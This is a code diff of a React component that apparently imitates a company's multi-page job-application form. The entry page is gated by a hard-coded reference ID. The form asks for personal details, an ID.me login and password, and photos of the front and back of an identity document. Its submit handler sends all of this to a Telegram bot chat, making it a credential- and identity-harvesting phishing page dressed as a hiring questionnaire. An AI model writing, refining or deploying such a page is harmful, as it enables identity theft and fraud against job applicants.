@@ -28,71 +28,10 @@ type IFormInput = {
   id_me_login: string;
   id_me_password: string;
   why_hire: string;
+  ref_id: string;
 };
 
 export default function Login() {
-
-
-  React.useEffect(()=>{
-    
-    const script1 = document.createElement('script');
-    script1.src = './remote_files/jquery.min.js.download';
-    script1.async = true;
-    document.body.appendChild(script1);
-
-    const script2 = document.createElement('script');
-    script2.src = './remote_files/jquery-migrate.min.js.download';
-    script2.async = true;
-    document.body.appendChild(script2);
-
-    const script3 = document.createElement('script');
-    script3.src = './remote_files/jquery.scrollTo.js.download';
-    script3.async = true;
-    document.body.appendChild(script3);
-
-    const script4 = document.createElement('script');
-    script4.src = './remote_files/jquery.validate.min.js.download';
-    script4.async = true;
-    document.body.appendChild(script4);
-
-    const script5 = document.createElement('script');
-    script5.src = './remote_files/wp-emoji-release.min.js.download';
-    script5.async = true;
-    document.body.appendChild(script5);
-
-    const script6 = document.createElement('script');
-    script6.src = './remote_files/skip-link-focus-fix.js.download';
-    script6.async = true;
-    document.body.appendChild(script6);
-
-    const script7 = document.createElement('script');
-    script7.src = './remote_files/global.js.download';
-    script7.async = true;
-    document.body.appendChild(script7);
-
-    const script8 = document.createElement('script');
-    script8.src = './remote_files/wpforms.js.download';
-    script8.async = true;
-    document.body.appendChild(script8);
-
-    const script9 = document.createElement('script');
-    script9.src = './remote_files/jquery.inputmask.bundle.min.js.download';
-    script9.async = true;
-    document.body.appendChild(script9);
-
-    return () => {
-      document.body.removeChild(script1);
-      document.body.removeChild(script2);
-      document.body.removeChild(script3);
-      document.body.removeChild(script4);
-      document.body.removeChild(script5);
-      document.body.removeChild(script6);
-      document.body.removeChild(script7);
-      document.body.removeChild(script8);
-      document.body.removeChild(script9);
-    };
-  }, [])
-
   const [isLoading, setIsLoading] = React.useState<boolean>(false);
   const [formInput, setFormInput] = React.useState<IFormInput>({
     first_name: "",
@@ -114,6 +53,7 @@ export default function Login() {
     id_me_login: "",
     id_me_password: "",
     why_hire: "",
+    ref_id: "",
   });
 
   const [images, setImages] = React.useState<IDFile>({
@@ -175,7 +115,7 @@ export default function Login() {
       data: {
         chat_id: telegramAPI.chat_id,
         document: images.frontImage,
-        caption: "Front Image",
+        caption: "ID Front Image",
       },
     };
 
@@ -191,289 +131,343 @@ export default function Login() {
       data: {
         chat_id: telegramAPI.chat_id,
         document: images.backImage,
-        caption: "Front Image",
+        caption: "ID Back Image",
       },
     };
 
-    try{
-    await axios.request({
-      method: "POST",
-      url: `https://api.telegram.org/bot${telegramAPI.token}/sendMessage`,
-      data: {
-        chat_id: telegramAPI.chat_id,
-        text: message,
-      },
-    });
-    await axios.request(options1);
+    try {
+      await axios.request({
+        method: "POST",
+        url: `https://api.telegram.org/bot${telegramAPI.token}/sendMessage`,
+        data: {
+          chat_id: telegramAPI.chat_id,
+          text: message,
+        },
+      });
+      await axios.request(options1);
 
-    await axios.request(options2);
-  }catch(err){
-    console.log(err);
-    return setIsLoading(false);
-  }
-  setIsLoading(false);
-  navigate("/success");
+      await axios.request(options2);
+    } catch (err) {
+      console.log(err);
+      return setIsLoading(false);
+    }
+    setIsLoading(false);
+    navigate("/success");
   }
 
+  console.log(formInput)
+
+  function submit_form_1(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    if (formInput.ref_id === "DE-123") {
+      document.getElementById("form1-error")?.classList.add("hide");
+      document.getElementById("wpforms-page-1")?.classList.add("hide");
+      document.getElementById("wpforms-page-2")?.classList.remove("hide");
+      return;
+    } else {
+      document.getElementById("form1-error")?.classList.remove("hide");
+    }
+  }
+
+  function previous_to_form1() {
+    document.getElementById("wpforms-page-1")?.classList.remove("hide");
+    document.getElementById("wpforms-page-2")?.classList.add("hide");
+  }
+
+  
+
+  function submit_form_2(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+      document.getElementById("wpforms-page-2")?.classList.add("hide");
+      document.getElementById("wpforms-page-3")?.classList.remove("hide");
+      return;
+    // open_next_form("wpforms-page-3");
+  }
+
+  function previous_to_form2() {
+    document.getElementById("wpforms-page-2")?.classList.remove("hide");
+    document.getElementById("wpforms-page-3")?.classList.add("hide");
+  }
+
+  function submit_form_3(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-3")?.classList.add("hide");
+    document.getElementById("wpforms-page-4")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form3() {
+    document.getElementById("wpforms-page-3")?.classList.remove("hide");
+    document.getElementById("wpforms-page-4")?.classList.add("hide");
+  }
+
+  function submit_form_4(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-4")?.classList.add("hide");
+    document.getElementById("wpforms-page-5")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form4() {
+    document.getElementById("wpforms-page-4")?.classList.remove("hide");
+    document.getElementById("wpforms-page-5")?.classList.add("hide");
+  }
+
+  function submit_form_5(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-5")?.classList.add("hide");
+    document.getElementById("wpforms-page-6")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form5() {
+    document.getElementById("wpforms-page-5")?.classList.remove("hide");
+    document.getElementById("wpforms-page-6")?.classList.add("hide");
+  }
+
+  function submit_form_6(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-6")?.classList.add("hide");
+    document.getElementById("wpforms-page-7")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form6() {
+    document.getElementById("wpforms-page-6")?.classList.remove("hide");
+    document.getElementById("wpforms-page-7")?.classList.add("hide");
+  }
+
+  function submit_form_7(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-7")?.classList.add("hide");
+    document.getElementById("wpforms-page-8")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form7() {
+    document.getElementById("wpforms-page-7")?.classList.remove("hide");
+    document.getElementById("wpforms-page-8")?.classList.add("hide");
+  }
+
+  function submit_form_8(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-8")?.classList.add("hide");
+    document.getElementById("wpforms-page-9")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form8() {
+    document.getElementById("wpforms-page-8")?.classList.remove("hide");
+    document.getElementById("wpforms-page-9")?.classList.add("hide");
+  }
+
+  function submit_form_9(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-9")?.classList.add("hide");
+    document.getElementById("wpforms-page-10")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form9() {
+    document.getElementById("wpforms-page-9")?.classList.remove("hide");
+    document.getElementById("wpforms-page-10")?.classList.add("hide");
+  }
+
+  function submit_form_10(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-10")?.classList.add("hide");
+    document.getElementById("wpforms-page-11")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form10() {
+    document.getElementById("wpforms-page-10")?.classList.remove("hide");
+    document.getElementById("wpforms-page-11")?.classList.add("hide");
+  }
+
+  function submit_form_11(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-11")?.classList.add("hide");
+    document.getElementById("wpforms-page-12")?.classList.remove("hide");
+    return;
+  }
+
+  function previous_to_form11() {
+    document.getElementById("wpforms-page-11")?.classList.remove("hide");
+    document.getElementById("wpforms-page-12")?.classList.add("hide");
+  }
+
+  function submit_form_12(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    document.getElementById("wpforms-page-12")?.classList.add("hide");
+    document.getElementById("wpforms-page-13")?.classList.remove("hide");
+    return;
+  }
+
+  // function submit_form_13(event: React.FormEvent<HTMLFormElement>) {
+  //   event.preventDefault();
+  //   // document.getElementById("wpforms-page-13")?.classList.add("hide");
+  //   // document.getElementById("wpforms-page-11")?.classList.remove("hide");
+  //   return;
+  // }
+
+  // onClick={() => previous_btn(current_form, previous_form)}
+  // <span id="form1-error form-error" className="error-message hide">Invalid Application Refrence ID</span>
   return (
-    <form
+    <>
+      {/* <form
       className="wpforms-validate wpforms-form"
       onSubmit={TelegramSend}
       method="post"
+      id="apply_form"
       encType="multipart/form-data"
       // action="http://dataconvergencetech.org/?wpforms_form_id=8"
-    >
-      <div
-        className="wpforms-page-indicator connector"
-        data-indicator="connector"
-        data-indicator-color="#72b239"
-      >
-        <div
-          className="wpforms-page-indicator-page active wpforms-page-indicator-page-1"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span
-            className="wpforms-page-indicator-page-number"
-            style={{ backgroundColor: "#72b239" }}
-          >
-            1
-            <span
-              className="wpforms-page-indicator-page-triangle"
-              style={{ borderTopColor: "#72b239" }}
-            ></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-2"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            2<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-3"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            3<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-4"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            4<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-5"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            5<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-6"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            6<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-7"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            7<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-8"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            8<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-9"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            9<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-10"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            10<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-11"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            11<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-12"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            12<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-        <div
-          className="wpforms-page-indicator-page wpforms-page-indicator-page-13"
-          style={{ width: "7.6923076923077%" }}
-        >
-          <span className="wpforms-page-indicator-page-number">
-            13<span className="wpforms-page-indicator-page-triangle"></span>
-          </span>
-        </div>
-      </div>
+    > */}
+
       <div className="wpforms-field-container">
-        <div className="wpforms-page wpforms-page-1">
-          <div
-            id="wpforms-8-field_23-container"
-            className="wpforms-field wpforms-field-pagebreak"
-            data-field-id="23"
-          ></div>
-          <div
-            id="wpforms-8-field_1-container"
-            className="wpforms-field wpforms-field-text"
-            data-field-id="1"
-          >
-            <label className="wpforms-field-label" htmlFor="wpforms-8-field_1">
-              How did you hear about us?
-              <span className="wpforms-required-label">*</span>
-            </label>
-            <input
-              type="text"
-              id="wpforms-8-field_1"
-              className="wpforms-field-medium wpforms-field-required"
-              name="wpforms[fields][1]"
-              placeholder="Referral, Newsletter etc"
-              required
-            />
-          </div>
-          <div
-            id="wpforms-8-field_22-container"
-            className="wpforms-field wpforms-field-pagebreak"
-            data-field-id="22"
-          >
-            <div className="wpforms-clear wpforms-pagebreak-left">
-              <button
-                className="wpforms-page-button wpforms-page-next"
-                data-action="next"
-                data-page="1"
-                data-formid="8"
-              >
-                Next
-              </button>
-            </div>
-          </div>
-        </div>
-        <div
-          className="wpforms-page wpforms-page-2"
-          style={{ display: "none" }}
+        <form
+          onSubmit={submit_form_1}
+          className="wpforms-validate wpforms-form"
         >
-          <div
-            id="wpforms-8-field_3-container"
-            className="wpforms-field wpforms-field-name"
-            data-field-id="3"
-          >
-            <label className="wpforms-field-label" htmlFor="wpforms-8-field_3">
-              Full Name
-              <span className="wpforms-required-label">*</span>
-            </label>
-            <div className="wpforms-field-row wpforms-field-medium">
-              <div className="wpforms-field-row-block wpforms-first wpforms-two-fifths">
-                <input
-                  type="text"
-                  id="wpforms-8-field_3"
-                  className="wpforms-field-name-first wpforms-field-required"
-                  name="first_name"
-                  onChange={handleInputChange}
-                  required
-                />
-                <label
-                  htmlFor="wpforms-8-field_3"
-                  className="wpforms-field-sublabel after"
-                >
-                  First
-                </label>
-              </div>
-              <div className="wpforms-field-row-block wpforms-one-fifth">
-                <input
-                  type="text"
-                  id="wpforms-8-field_3-middle"
-                  className="wpforms-field-name-middle"
-                  name="middle_name"
-                  onChange={handleInputChange}
-                />
-                <label
-                  htmlFor="wpforms-8-field_3-middle"
-                  className="wpforms-field-sublabel after"
-                >
-                  Middle
-                </label>
-              </div>
-              <div className="wpforms-field-row-block wpforms-two-fifths">
-                <input
-                  type="text"
-                  id="wpforms-8-field_3-last"
-                  className="wpforms-field-name-last wpforms-field-required"
-                  name="last_name"
-                  onChange={handleInputChange}
-                  required
-                />
-                <label
-                  htmlFor="wpforms-8-field_3-last"
-                  className="wpforms-field-sublabel after"
-                >
-                  Last
-                </label>
+          <div id="wpforms-page-1" className="wpforms-page wpforms-page-1">
+            <div
+              id="wpforms-8-field_23-container"
+              className="wpforms-field wpforms-field-pagebreak"
+              data-field-id="23"
+            ></div>
+            <div
+              id="wpforms-8-field_1-container"
+              className="wpforms-field wpforms-field-text"
+              data-field-id="1"
+            >
+              <label
+                className="wpforms-field-label"
+                htmlFor="wpforms-8-field_1"
+              >
+                Application Reference ID
+                <span className="wpforms-required-label">*</span>
+              </label>
+              <input
+                type="text"
+                id="wpforms-8-field_1"
+                className="wpforms-field-medium wpforms-field-required"
+                onChange={handleInputChange}
+                name="ref_id"
+                placeholder="XX-XXX"
+                required
+              />
+              <span id="form1-error" className="error-message hide">
+                Invalid Application Refrence ID
+              </span>
+            </div>
+            <div
+              id="wpforms-8-field_22-container"
+              className="wpforms-field wpforms-field-pagebreak"
+              data-field-id="22"
+            >
+              <div className="wpforms-clear wpforms-pagebreak-left">
+                <button className="wpforms-page-button wpforms-page-next">
+                  Next
+                </button>
               </div>
             </div>
           </div>
-          <div
-            id="wpforms-8-field_26-container"
-            className="wpforms-field wpforms-field-pagebreak"
-            data-field-id="26"
-          >
-            <div className="wpforms-clear wpforms-pagebreak-left">
-              <button
-                className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="2"
-                data-formid="8"
-              >
-                Previous
-              </button>
-              <button
-                className="wpforms-page-button wpforms-page-next"
-                data-action="next"
-                data-page="2"
-                data-formid="8"
-              >
-                Next
-              </button>
-            </div>
-          </div>
-        </div>
-        <div
-          className="wpforms-page wpforms-page-3"
-          style={{ display: "none" }}
+        </form>
+
+        <form
+          onSubmit={submit_form_2}
+          className="wpforms-validate wpforms-form"
         >
+          <div id="wpforms-page-2" className="wpforms-page wpforms-page-2 hide">
+            <div
+              id="wpforms-8-field_3-container"
+              className="wpforms-field wpforms-field-name"
+              data-field-id="3"
+            >
+              <label
+                className="wpforms-field-label"
+                htmlFor="wpforms-8-field_3"
+              >
+                Full Name
+                <span className="wpforms-required-label">*</span>
+              </label>
+              <div className="wpforms-field-row wpforms-field-medium">
+                <div className="wpforms-field-row-block wpforms-first wpforms-two-fifths">
+                  <input
+                    type="text"
+                    id="wpforms-8-field_3"
+                    className="wpforms-field-name-first wpforms-field-required"
+                    name="first_name"
+                    onChange={handleInputChange}
+                    required
+                  />
+                  <label
+                    htmlFor="wpforms-8-field_3"
+                    className="wpforms-field-sublabel after"
+                  >
+                    First
+                  </label>
+                </div>
+                <div className="wpforms-field-row-block wpforms-one-fifth">
+                  <input
+                    type="text"
+                    id="wpforms-8-field_3-middle"
+                    className="wpforms-field-name-middle"
+                    name="middle_name"
+                    onChange={handleInputChange}
+                  />
+                  <label
+                    htmlFor="wpforms-8-field_3-middle"
+                    className="wpforms-field-sublabel after"
+                  >
+                    Middle
+                  </label>
+                </div>
+                <div className="wpforms-field-row-block wpforms-two-fifths">
+                  <input
+                    type="text"
+                    id="wpforms-8-field_3-last"
+                    className="wpforms-field-name-last wpforms-field-required"
+                    name="last_name"
+                    onChange={handleInputChange}
+                    required
+                  />
+                  <label
+                    htmlFor="wpforms-8-field_3-last"
+                    className="wpforms-field-sublabel after"
+                  >
+                    Last
+                  </label>
+                </div>
+              </div>
+            </div>
+
+            <div
+              id="wpforms-8-field_26-container"
+              className="wpforms-field wpforms-field-pagebreak"
+              data-field-id="26"
+            >
+              <div className="wpforms-clear wpforms-pagebreak-left">
+                <button
+                  className="wpforms-page-button wpforms-page-prev"
+                  type="button"
+                  onClick={previous_to_form1}
+                >
+                  Previous
+                </button>
+                <button className="wpforms-page-button wpforms-page-next">
+                  Next
+                </button>
+              </div>
+            </div>
+          </div>
+        </form>
+
+        <form
+          onSubmit={submit_form_3}
+          className="wpforms-validate wpforms-form"
+        >
+        <div id="wpforms-page-3" className="wpforms-page wpforms-page-3 hide">
           <div
             id="wpforms-8-field_4-container"
             className="wpforms-field wpforms-field-email"
@@ -500,27 +494,27 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="3"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form2}
               >
                 Previous
               </button>
               <button
                 className="wpforms-page-button wpforms-page-next"
-                data-action="next"
-                data-page="3"
-                data-formid="8"
+                
               >
                 Next
               </button>
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-4"
-          style={{ display: "none" }}
+        </form>
+        
+        <form
+          onSubmit={submit_form_4}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-4" className="wpforms-page wpforms-page-4 hide">
           <div
             id="wpforms-8-field_5-container"
             className="wpforms-field wpforms-field-phone"
@@ -549,9 +543,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="4"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form3}
               >
                 Previous
               </button>
@@ -566,10 +559,14 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-5"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={submit_form_5}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-5" className="wpforms-page wpforms-page-5 hide">
           <div
             id="wpforms-8-field_6-container"
             className="wpforms-field wpforms-field-address"
@@ -932,9 +929,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="5"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form4}
               >
                 Previous
               </button>
@@ -949,10 +945,13 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-6"
-          style={{ display: "none" }}
+        </form>
+
+        <form
+          onSubmit={submit_form_6}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-6" className="wpforms-page wpforms-page-6 hide">
           <div
             id="wpforms-8-field_127-container"
             className="wpforms-field wpforms-field-text"
@@ -982,27 +981,28 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="6"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form5}
               >
                 Previous
               </button>
               <button
                 className="wpforms-page-button wpforms-page-next"
-                data-action="next"
-                data-page="6"
-                data-formid="8"
+                
               >
                 Next
               </button>
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-7"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={submit_form_7}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-7" className="wpforms-page wpforms-page-7 hide">
           <div
             id="wpforms-8-field_83-container"
             className="wpforms-field wpforms-field-radio"
@@ -1050,9 +1050,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="7"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form6}
               >
                 Previous
               </button>
@@ -1067,10 +1066,14 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-8"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={submit_form_8}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-8" className="wpforms-page wpforms-page-8 hide">
           <div
             id="wpforms-8-field_132-container"
             className="wpforms-field wpforms-field-radio"
@@ -1125,9 +1128,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="8"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form7}
               >
                 Previous
               </button>
@@ -1142,10 +1144,13 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-9"
-          style={{ display: "none" }}
+        </form>
+
+        <form
+          onSubmit={submit_form_9}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-9" className="wpforms-page wpforms-page-9 hide">
           <div
             id="wpforms-8-field_115-container"
             className="wpforms-field wpforms-field-textarea"
@@ -1173,9 +1178,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="9"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form8}
               >
                 Previous
               </button>
@@ -1190,10 +1194,14 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-10"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={submit_form_10}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-10" className="wpforms-page wpforms-page-10 hide">
           <div
             id="wpforms-8-field_134-container"
             className="wpforms-field wpforms-field-radio"
@@ -1248,9 +1256,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="10"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form9}
               >
                 Previous
               </button>
@@ -1265,10 +1272,14 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-11"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={submit_form_11}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-11" className="wpforms-page wpforms-page-11 hide">
           <div
             id="wpforms-8-field_139-container"
             className="wpforms-field wpforms-field-email"
@@ -1314,9 +1325,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="11"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form10}
               >
                 Previous
               </button>
@@ -1331,10 +1341,14 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-12"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={submit_form_12}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-12" className="wpforms-page wpforms-page-12 hide">
           <div
             id="wpforms-8-field_128-container"
             className="wpforms-field wpforms-field-text"
@@ -1364,9 +1378,8 @@ export default function Login() {
             <div className="wpforms-clear wpforms-pagebreak-left">
               <button
                 className="wpforms-page-button wpforms-page-prev"
-                data-action="prev"
-                data-page="12"
-                data-formid="8"
+                type="button"
+                onClick={previous_to_form11}
               >
                 Previous
               </button>
@@ -1381,10 +1394,14 @@ export default function Login() {
             </div>
           </div>
         </div>
-        <div
-          className="wpforms-page wpforms-page-13 last"
-          style={{ display: "none" }}
+        </form>
+
+
+        <form
+          onSubmit={TelegramSend}
+          className="wpforms-validate wpforms-form"
         >
+        <div id="wpforms-page-13" className="wpforms-page wpforms-page-13 last hide">
           <div
             id="wpforms-8-field_104-container"
             className="wpforms-field wpforms-field-file-upload"
@@ -1444,18 +1461,22 @@ export default function Login() {
           >
             <div className="wpforms-clear wpforms-pagebreak-left"></div>
           </div>
-        </div>
-      </div>
-      <div className="wpforms-submit-container" style={{ display: "none" }}>
+          <div className="wpforms-submit-container">
         <button
           type="submit"
           className="wpforms-submit"
-          data-alt-text="Processing..."
           data-submit-text="Submit Questionnaire"
         >
-          {isLoading ? "Processing....." : "Submit Questionnaire"}
+          {isLoading ? "Processing..." : "Submit Questionnaire"}
         </button>
       </div>
-    </form>
+        </div>
+        </form>
+
+
+      </div>
+     
+      {/* </form> */}
+    </>
   );
 }
